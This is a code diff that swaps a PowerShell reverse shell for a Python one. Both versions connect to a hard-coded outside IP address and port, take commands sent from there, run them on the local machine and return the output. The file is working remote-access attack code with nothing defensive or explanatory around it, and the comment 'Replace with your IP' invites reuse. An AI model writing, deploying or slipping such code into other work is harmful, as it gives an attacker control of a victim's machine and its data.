@@ -1,18 +1,30 @@
+import socket
 import subprocess
 
-# Example PowerShell command
-ps_command = '''$LHOST = "92.247.214.122"; $LPORT = 9876; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
+HOST = '92.247.214.122'  # Replace with your IP
+PORT = 9876              # Replace with your port
 
-# Run PowerShell command
-result = subprocess.run(
-    ["powershell", "-Command", ps_command],
-    capture_output=True,
-    text=True
-)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
 
-# Output the result
-print("STDOUT:")
-print(result.stdout)
+while True:
+    try:
+        # Receive command
+        command = s.recv(1024).decode().strip()
+        if command.lower() == "exit":
+            break
 
-print("STDERR:")
-print(result.stderr)
+        # Execute the command
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout + result.stderr
+
+        # Send back the output
+        if output:
+            s.send(output.encode())
+        else:
+            s.send(b"[+] Command executed with no output.\n")
+
+    except Exception as e:
+        s.send(f"[-] Error: {str(e)}\n".encode())
+
+s.close()
